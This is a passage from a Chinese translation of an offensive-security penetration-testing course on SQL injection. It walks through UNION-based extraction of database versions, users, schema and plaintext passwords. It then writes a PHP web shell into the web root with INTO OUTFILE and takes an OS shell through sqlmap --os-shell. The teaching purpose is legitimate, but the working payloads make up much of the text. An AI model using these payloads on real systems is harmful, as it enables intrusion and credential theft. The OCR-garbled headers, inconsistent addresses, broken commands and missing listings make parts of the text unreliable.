
# PWK 2.0 版权所有 © Offensive Security Ltd. 保留所有权利。328

做到这一点，我们必须首先在 Burp Suite 中启动请求，查看我们想要重复的 URL。

## 图 163：查看 HTTP

### Kali Linux 2.0 渗透测试

| Method | Host | Length | Type | Title | Comment |
| :--- | :--- | :--- | :--- | :--- | :--- |
| GET | | | | | |
| GET | | | | | |
| GET | | | | | |
| GET | | | | | |
| GET | | | | | |
| GET | | | | | |
| GET | | | | | |
| GET | | | | | |
| GET | | | | | |
| | | | | | |
| | | | | | |
| | | | | | |
| | | | | | |
| | | | | | |
| | | | | | |
| | | | | | |
| | | | | | |
| | | | | | |

## 图 164：查看 HTTP

### Kali Linux 2.0 渗透测试

接下来，我们将右键点击请求并选择 Repeater。请求现在应该显示在 Repeater 标签页下了。

注意请求已进行 URL 编码并显示为 `id=1%20order%20by%201`。这不应影响我们的查询。我们可以点击 Send 提交查询：

## 图 165：使用 Kali Repeater

响应看起来正常。我们可以使用响应面板下方的搜索框搜索“Error”，并验证响应正文中没有匹配项。

## 图 166：中继器结果

### 使用 Kali Linux 2.0 进行渗透测试

接下来，我们可以增加 `order by` 子句并搜索查询，直到收到错误消息为止。我们可以使用响应下方的 `search` 搜索框来高亮响应中的错误：

## 图 167：在 Burp Suite 中使用搜索栏。由于第四次迭代中发生了粗暴错误，查询返回了一个包含三列的 Result集。

## 9.4.5.7 理解输出布局

现在我们知道表中有多少列了，可以使用 `UNION` 语句通过 UNION 来提取更多数据。Unions 允许我们向原始查询添加第二个选择选择，从而扩展我们的能力，但每个 select 语句必须返回相同数量的列。

根据我们的枚举，我们知道查询三选取了某些列。然而，网页上只显示了两个列。我们的下一步是确定哪些列被显示了。我们使用 union 来提取有用数据，并确保这些数据会被显示出来。

我们需要理解输出内容，以便开始构建有意义的数据库提取。首先，让我们了解一下哪些列被显示了。我们使用 UNION 来此。我们可以指定字面量值，而不是从表中查找值。由于我们有三列，我们将向查询中添加 `union all select 1, 2, 3`。这个新的 select 语句将返回值为 1、2 和 3 的三列。我们的负载（payload）如下：

```
GET /index.php?id=226 HTTP/1.1
Host: target@10.0.11.22
Date: Wed, 01 Oct 2019 15:37:26 GMT
Server: Apache/2.4.37 (Win32) OpenSSL/5.6.4 - PHP/5.6.40
User-Agent: Mozilla/5.0 (KHTML; Linux x86_64; rv:60.0) (KHTML, Gecko/20100101)
Accept: text/html,application/xml,application+xml,*/*;q=0.9
Connection: keep-alive
Content-Length: 123
```

```
GET /debug.php?id=1%26id%3D24 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application;q=0.9,* q=0.8
Connection: keep-alive
Cookie: PHPSESSID=ecc93b1a4ad928622e9bb67
Upgrade-Insecure-Requests: 1
```

```html
<html
<body>
<div class="menu">
<ul>
<li class="current"><a href="</a><span class="active">Home</span></span>></span></li>
<li><a href="feedback">Feedback</a></li>
<li><a href="admin.php">Admin</a></li>
</ul>
</div>
<div class="row">
<table class="table-striped">
<tr>
<td><<<b>Error</b> An error: Unknown column '4' in 'order clause' in <b>C:/xampp/php/htdocs/debug.php</b> on line <b>42</b> of 0</td>
</tr>
</table>
</div>
</body>
</html>
```

页面显示不同列的位置如下所示：

## 图 168：查看 Union 负载的 own

我们可以看到其中一列没有被显示，第二列显示在 name（名称）字段中，第三列显示在 comment（注释）字段中。注释字段空间更大，因此这是我们未来利用的逻辑位置。如果这些内容有任何不清楚的地方，现在是直接连接数据库并尝试这些查询的好时机。你不需要成为一名丰富的数据库管理员；你对这些查询的操作越熟悉，从 SQL 错误信息过渡到成功利用 SQL 漏洞就越容易。

## 9.4.5.8 从数据库中提取数据

我们现在可以开始从数据库提取信息了。以下示例使用了 MariaDB 的特定命令。大多数其他数据库提供不同语法的类似功能。无论我们使用哪种数据库，了解平台特定的命令都是最好的。例如，要输出 MariaDB 的版本，我们可以使用这个：

```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, version
```

## 图 169：提取 MariaDB 版本号

这应该在 name 字段中输出“2”，并在 comment 字段中输出数据库版本号：很好。看起来正在运行。接下来，让我们用这个查询输出当前的数据库用户：

```
http://10.11.0.22/debug.php?id=1 union select 1, 2, user()
```

此查询揭示了数据库查询使用的是 root 用户：

## 图 170：提取当前数据库用户

我们可以通过 `information_schema` 枚举数据库表和列结构。Information schema 存储关于数据库的信息，例如表名和列名。我们可以利用它获取数据库的布局，以便构造更好的负载来提取敏感数据。该查询看起来如下：

```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables
```

这应该输出大量数据，其中大部分是关于 MariaDB默认对象的信息。它也会包含表名，但我们需要滚动查看输出以找到它们。

## 图 171：从数据库提取表名

users 表看起来特别有趣。让我们针对该表并通过以下查询检索列名：

```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
```

这输出了 `users` 表的所有列名：

## Tom 的塔可餐车

| admin | p@ssw0rd |
| :--- | :--- |
| jigsaw | footworkure |
| backdoor | backdoor |

## 图 173：提取用户表的内容

太棒了。我们不仅获取了用户名和密码，而且这些密码都是明文存储的。我们可以通过登录 admin 页面来验证这些信息。

PWK 2.0 版权所有 © Offensive Security Ltd 保留所有权利。337

我们可以查看源代码来验证我们通过黑盒测试得出的结论：

### 使用 Kali Linux 进行渗透测试 2.0

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_386_0.png)

```php
<?php
include "database.php";
if (isset($_GET['id'])) {
    $sql = "SELECT id, name, text FROM feedback WHERE id=" . $_GET['id'];
    $result = $conn->query($sql);
    if ($result) {
        trigger_error("An error occurred: " . $conn->error);
    } else if ($result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            echo "<tr><td>" . $row['name'] . "</td><td>" . $row['text'] . "</td></tr>";
        }
    } else {
        echo "No results. Specify an id.";
    }
} else {
    echo "No results. Specify an id in your URL ?id=1";
}
?>
```

## 列表 332 - debug.php 的代码片段

导致 SQL 注入引发数据库调试的漏洞代码位于列表 332 的第 39 行。注入点位于 "WHERE" 子句查询的末尾，这使得使用 "UNION" 负载变得简单。查询结果被获取后在第 45 行输出显示。注意，虽然查询中包含了三列，但只显示了其中两列。这就是为什么我们使用第二列和第三列来从另一个表中提取数据。

## 9.4.5.9 练习

1. 使用 SQL 注入枚举数据库结构。
2. 理解你如何以及为什么可以从注入的命令中提取数据并将其显示在屏幕上。
3. 从数据库中提取所有用户及其关联密码。

## 9.4.5.10 从 SQL 注入到代码执行

让我们看看能将此漏洞推到多远。根据操作系统、服务权限和文件系统权限，SQL 注入漏洞可以用于在底层操作系统上读取和写入文件。在 Web 服务器的根目录下写入一个包含 PHP 代码的精心构造的文件，随后可以被用于实现完全的代码执行。

首先，让我们看看是否可以使用 `load_file` 函数读取文件：

## 列表 333 - 使用 `load_file` 函数的 SQL 注入负载

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_387_0.png)

PWK 2.0 版权所有 © Offensive Security Ltd 保留所有权利。338

# 这应该输出 hosts 文件的内容：

### 使用 Kali Linux 进行渗透测试 2.0

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_388_0.png)

## 图 174：使用 Load File 函数

接下来，我们将尝试使用 `OUTFILE` 函数在服务器的 Web 根目录下创建一个恶意的 PHP 文件。根据已经看到的错误信息，我们应该知道 Web 根目录的位置。我们将尝试写入一个简单的 PHP 单行代码，类似于我们在 LFI 示例中使用的那一个：

## 列表 334 - 使用 `OUTFILE` 函数写入 PHP Shell 的 SQL 注入负载

如果成功，该文件将应该放置在 Web 根目录下：

## 图 175：利用 SQL 注入写入 PHP Shell

此命令产生了一个错误信息，但这并不意味着文件创建失败了。让我们尝试带有 `cmd` 参数（如 `ipconfig`）访问新创建的 `backdoor.php` 页面：

```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']); ?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_389_0.png)

最著名的工具之一是 Kali Linux 中安装的 `sqlmap`。让我们在示例 Web 应用程序上使用 sqlmap。我们将使用 `-u` 设置想要扫描的 URL，并使用 `-p` 指定要测试的参数：

### 使用 Kali Linux 进行渗透测试 2.0

# OFFENSIVE SECURITY

offensivesecurity.com

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_390.png)

太棒了。我们已经将 SQL 注入漏洞转化为了服务器上的代码执行。我们可以通过安装 webshell 轻松将其扩展为完全的 shell 访问。图 16：使用后门 PHP 命令 Shell

### 9.4.5.11 练习

1. 利用 SQL 注入配合 OUTFILE 函数利用 MariaDB。
2. 将简单的代码执行转换为完全 shell。

Sqlmap 具有许多其他功能，例如自动化绕过 Web 应用防火墙 (WAF) 以及执行复杂的查询以自动接管服务器控制权。例如，使用 `os-shell` 参数将尝试在目标系统上自动上传并执行远程命令。

我们可以通过运行带有 `--os-shell` 参数的 sqlmap 来使用此功能，在系统上执行 shell：

```
[13:56:58] [INFO] table 'webappdb_users' 导出到 CSV 文件 '/home/kali/sqlmap/output/10.11.02.22/dump/webappdb_users.csv'
[13:56:58] [INFO] 获取的数据已记录到文本文件 '/home/kali/sqlmap/output/10.11.02.22'
```

```
kali@kali:~ $ sqlmap -u http://10.11.02.22/debug.php?id=1 -p "dbms=mysql --os-shell
```

[14:00:09] 文件阶段已通过 LIMIT 'LI NOT TERMINATED BY' 方法成功上传到 'C:/xampp/htdocs/'

[14:00:09] 文件阶段已成功上传到 'C:/xampp/htdocs/' - http://10.11.02.22/tmpuwryd.php

[14:00:09] 后门程序已成功上传到 'C:/xampp/htdocs/' - http://10.11.02.22/tmbptsja.jpa

[14:00:09] 正在调用 OS shell。要退出请输入 'x' 或 'q' 并按回车 os-shell ipconfig

你想要检索标准命令输出吗？[Y/n/a] y

# Windows IP 配置

以太网适配器 Ethernet0:

特定的 DNS 后缀 . . local

本地链路 IPv4 地址 . . . . . . : fe80:05ca:accd8:9e03:3bf5%7

IPv4 地址 . . . . . . . : 10.11.02.22

子网掩码 . . . . . . . : : 255.255.255.0

默认网关 . . . . . . . : 10.11.02.2

以太网适配器蓝牙网络连接:

媒体状态 . . . . . . . : 媒体未连接 特定的 DNS 后缀 . .

```
os-shell>
```

## 337 - 使用 sqlmap 获取 OS shell

一旦 sqlmap 建立起 shell，我们就可以在服务器上运行命令并查看输出，如图 337 所示。这种方法可能有点慢，但它可以提供一个获取底层服务器访问的有效足点。

请注意，OSCP 考试中不允许使用 sqlmap。然而，我们建议在实验环境和 Windows 10 实验机器上进行练习。请考虑结合 Burp 和 Wireshark 等工具来捕获工具正在的操作，然后尝试手动重现攻击。这通常是一种非常有效的学习技术，不应被。

## 9.4.5.13 练习题

- 1. 使用 sqlmap 获取数据库的完整导出。
- 2. 使用 sqlmap 获取交互式 shell。

## 9.5 额外里程

Windows 10 实验机器包含一个额外的 Web ，用于练习 XSS 和 SQL 注入漏洞。该应用程序使用 Java 编写，基于 Spring 框架，端口为 9090。可以使用以下命令运行应用程序：
